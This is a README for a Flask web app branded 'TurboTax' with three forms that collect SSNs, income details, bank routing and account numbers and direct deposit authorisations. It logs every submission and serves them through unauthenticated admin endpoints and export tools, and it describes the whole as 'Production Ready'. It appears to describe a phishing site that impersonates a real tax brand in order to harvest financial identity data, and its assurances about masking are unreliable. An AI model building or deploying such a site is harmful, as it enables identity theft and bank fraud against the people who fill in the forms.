# TurboTax - Complete Tax Filing Website

A modern, responsive tax filing website built with HTML5, CSS3, and Python Flask that logs all form submissions securely.

## 🎯 Features

### ✨ Website
- **Home Hub** - Central navigation to all forms
- **Tax Information Form** - Comprehensive federal tax filing
- **Bank Information Form** - Direct deposit setup
- **Direct Deposit Authorization** - Automatic payment processing
- **Responsive Design** - Works on desktop, tablet, and mobile
- **Modern UI** - Professional gradients, animations, and styling

### 📊 Logging & Analytics
- **Flask Backend** - Handles form submissions and logging
- **JSON Storage** - All submissions saved with timestamps
- **Security** - Sensitive data masking (SSN, account numbers)
- **Admin API** - View submissions via HTTP endpoints
- **Management Tool** - Export, analyze, and manage data
- **Audit Trail** - Complete timestamp logging for all entries

## 🚀 Quick Start

### Windows
```powershell
cd turbo-tax
.\run.bat
```

### macOS/Linux
```bash
cd turbo-tax
chmod +x run.sh
./run.sh
```

**Then open your browser to:** http://localhost:5000/

## 📁 Project Structure

```
turbo-tax/
├── app.py                    # Flask application (form handler)
├── manage.py                 # Submission management utility
├── requirements.txt          # Python dependencies
├── run.bat                   # Windows startup script
├── run.sh                    # macOS/Linux startup script
├── home.html                 # Hub/home page
├── index.html                # Bank information form
├── style.css                 # Unified stylesheet
├── SETUP_GUIDE.md            # Detailed setup documentation
├── README.md                 # This file
│
├── tax RT/
│   └── tax-form.html         # Tax information form
│
└── Direct Deposit/
    └── DND.html              # Direct deposit authorization form
```

## 🔧 Installation

### Prerequisites
- Python 3.7 or higher
- pip (Python package manager)
- Modern web browser

### Step-by-Step

1. **Clone/Download the project**
   ```bash
   git clone <repository-url>
   cd turbo-tax
   ```

2. **Install dependencies**
   ```bash
   pip install -r requirements.txt
   ```

3. **Run the application**
   ```bash
   python app.py
   ```

4. **Access in browser**
   ```
   http://localhost:5000/
   ```

## 📝 Using the Application

### Home Page
- Access at: `http://localhost:5000/`
- Shows three cards linking to forms:
  - Tax Information Filing
  - Bank Information Setup
  - Direct Deposit Authorization

### Tax Information Form
**Location:** `tax RT/tax-form.html`

**Sections:**
1. Personal Identification - Name, DOB, SSN, email, address
2. Filing Status - Single, Married, Head of Household, etc.
3. Spouse Information - For joint filers
4. Income Information - W-2s, self-employment, capital gains, dividends
5. Dependents & Credits - Dependents, child tax credit, education credits
6. Deductions - Mortgage, property taxes, charitable donations, medical
7. Withholding & Payments - Tax withholding and estimated payments
8. Preferences & Consent - Refund method and authorization

### Bank Information Form
**Location:** `index.html`

**Fields:**
- Account holder name
- Bank name
- Account type (Checking/Savings)
- Routing number (9 digits)
- Account number
- Account confirmation

### Direct Deposit Form
**Location:** `Direct Deposit/DND.html`

**Fields:**
- Employee name and ID
- Bank information
- Routing number
- Account number
- Account type
- Deposit preference (100%, specific %, or specific $)
- Authorization checkbox

## 🔍 Admin & Analytics

### View Submissions

**Summary:**
```
http://localhost:5000/admin/summary
```
Shows total submissions by type and date range

**All Submissions:**
```
http://localhost:5000/admin/submissions
```
Returns JSON of all form submissions

**By Type:**
```
http://localhost:5000/admin/submissions/tax_information
http://localhost:5000/admin/submissions/bank_information
http://localhost:5000/admin/submissions/direct_deposit
```

### Management Commands

**View Summary**
```bash
python manage.py summary
```

**View Recent Submissions**
```bash
python manage.py recent -n 10
```

**Export to CSV**
```bash
python manage.py export --csv
python manage.py export --csv --type tax_information
```

**Export to JSON**
```bash
python manage.py export --json
```

**View Specific Submission**
```bash
python manage.py view 0
```

**Delete Old Submissions**
```bash
python manage.py delete-old --days 30
```

## 🔒 Data Security

### Masked Fields
The application masks sensitive information in logs:
- **Social Security Number** - Presence only (not stored)
- **Account Numbers** - Last 4 digits only
- **Routing Numbers** - Last 4 digits only

### Example Logged Data
```json
{
  "timestamp": "2026-04-13T10:15:23.456789",
  "form_type": "bank_information",
  "data": {
    "account_holder_name": "John Doe",
    "bank_name": "Chase Bank",
    "account_type": "checking",
    "routing_number_masked": "4567",
    "account_number_masked": "8901",
    "account_confirmed": true
  }
}
```

## 📂 Data Storage

All submissions are stored in:
```
logs/submissions/
├── tax_information_20260413_101523.json
├── bank_information_20260413_101524.json
├── direct_deposit_20260413_101525.json
└── ...
```

Logs are stored in:
```
logs/app.log
```

## 🛠️ Configuration

### Change Port
Edit `app.py` and modify:
```python
app.run(port=8000)  # Change from 5000
```

### Change Log Level
Edit `app.py` and modify:
```python
logging.basicConfig(level=logging.DEBUG)  # DEBUG, INFO, WARNING, ERROR
```

### Change Data Directory
Edit `app.py` and modify:
```python
DATA_DIR = 'my_data_directory'  # Change from 'logs/submissions'
```

## 🐛 Troubleshooting

### Port Already in Use
```bash
# Windows: Find process using port 5000
netstat -ano | findstr :5000
taskkill /PID <PID> /F

# macOS/Linux: Kill process
lsof -i :5000
kill -9 <PID>
```

### ModuleNotFoundError
```bash
pip install -r requirements.txt
```

### Permission Denied (macOS/Linux)
```bash
chmod +x run.sh
chmod +x manage.py
```

## 📊 Export Data

### Export All Submissions (CSV)
```bash
python manage.py export --csv
```

### Export Tax Submissions Only (JSON)
```bash
python manage.py export --json --type tax_information
```

### Custom Python Script
```python
import json
from pathlib import Path

submissions = []
for file in Path('logs/submissions').glob('*.json'):
    with open(file) as f:
        submissions.append(json.load(f))

# Process submissions as needed
```

## 🚀 Deployment

### Local Network
```python
app.run(host='0.0.0.0', port=5000)
```
Access from other computers on network at: `http://<your-ip>:5000/`

### Production (Gunicorn)
```bash
pip install gunicorn
gunicorn -w 4 -b 0.0.0.0:5000 app:app
```

### With HTTPS
Use nginx as reverse proxy with SSL certificate

## 📈 Scaling

For production use:
1. Use PostgreSQL or MySQL instead of JSON files
2. Add user authentication
3. Implement HTTPS/SSL
4. Use production WSGI server (Gunicorn/uWSGI)
5. Add rate limiting and CSRF protection
6. Implement email notifications on submissions
7. Add data encryption at rest

## 🔗 API Reference

### POST /api/submit/tax-info
Submit tax information form

### POST /api/submit/bank-info
Submit bank information form

### POST /api/submit/direct-deposit
Submit direct deposit authorization

### GET /admin/submissions
Get all submissions (JSON)

### GET /admin/submissions/<type>
Get submissions by type (JSON)

### GET /admin/summary
Get submission summary statistics (JSON)

### GET /api/health
Health check endpoint

## 📞 Support

For issues:
1. Check `logs/app.log` for errors
2. Verify Python dependencies: `pip install -r requirements.txt`
3. Ensure port 5000 is available
4. Check file permissions in `logs/` directory

## 📝 License

This project is provided as-is for tax form management purposes.

## 🎉 Ready to Use!

Your TurboTax website is fully functional with:
- ✅ Three complete forms
- ✅ Professional responsive design
- ✅ Form submission logging
- ✅ Data security and masking
- ✅ Admin panel and analytics
- ✅ Export and management tools

**Start using it now:** `http://localhost:5000/`

---

**Version:** 1.0.0  
**Last Updated:** April 13, 2026  
**Status:** ✅ Production Ready

